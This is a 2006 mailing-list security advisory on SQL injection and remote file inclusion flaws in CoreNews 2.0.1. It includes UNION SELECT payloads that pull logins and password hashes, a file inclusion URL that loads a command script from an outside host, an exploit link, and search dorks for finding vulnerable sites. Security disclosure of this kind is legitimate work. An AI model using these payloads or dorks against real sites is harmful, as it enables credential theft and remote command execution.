
Date: Sat, 22 Apr 2006 00:56:16 +0300
From: "Mustafa Can Bjorn IPEKCI" <nukedx@...edx.com>
To: full-disclosure@...ts.grok.org.uk, bugtraq@...urityfocus.com,
	core@...eslawn.de
Subject: Advisory: CoreNews <= 2.0.1 Multiple Remote Vulnerabilities.



--Security Report--
Advisory: CoreNews <= 2.0.1 Multiple Remote Vulnerabilities.
---
Author: Mustafa Can Bjorn "nukedx a.k.a nuker" IPEKCI
---
Date: 21/04/06 21:43 PM
---
Contacts:{
ICQ: 10072
MSN/Email: nukedx@...edx.com
Web: http://www.nukedx.com
}
---
Vendor: CoreNews (http://www.coreslawn.de/)
Version: 2.0.1 and prior versions must be affected.
About: Via this method remote attacker can inject arbitrary SQL queries to 
icon_id and userid parameters in preview.php
Also loginned person can easily include arbitrary files and execute command 
via CoreNews, because the show parameter in index.php
did not sanitized properly you can found vulnerable code in index.php at line 
201.
So it can be easy for remote attacker to login system by using SQL injection 
and got users hashed password and load file via
this users account.
Level: Highly Critical
---
How&Example: 
SQL Injection :
Needs MySQL > 4.0
GET -> http://[victim]/[CoreNewsDir]/preview.php?userid=[SQL]
GET -> http://[victim]/[CoreNewsDir]/preview.php?icon_id=[SQL]
GET -> http://[victim]/[CoreNewsDir]/preview.php?userid=[SQL]&icon_id=[SQL]
EXAMPLE -> 

http://[victim]/[CoreNewsDir]/preview.php?userid=-1/**/UNION/**/SELECT/**/null,
concat(2022,login,20223,password,2203),null,null,null,null/**/FROM/**/corenews_users/*
EXAMPLE -> 

http://[victim]/[CoreNewsDir]/preview.php?icon_id=-1/**/UNION/**/SELECT/**/0,password,login
/**/FROM/**/corenews_users/*
And you can use both SQL example in same time.
with this examples remote attacker can leak speficied users login information 
from database.

Remote File Inclusion :
Needs logged in to system and allow_url_fopen set 1 in server configuration.
GET -> http://[victim]/[CoreNewsDir]/?show=[FILE]
EXAMPLE -> http://[victim]/[CoreNewsDir]/?show=http://myhost.com/cmd.txt?
---
Timeline:
* 21/04/2006: Vulnerability found.
* 21/04/2006: Contacted with vendor and waiting reply.
---
Exploit:
http://www.nukedx.com/?getxpl=24
---
Dorks: "powered by Corenews 2.0.1" , inurl:/corenews/ , inurl:/corenews2/
---
Original advisory can be found at: http://www.nukedx.com/?viewdoc=24


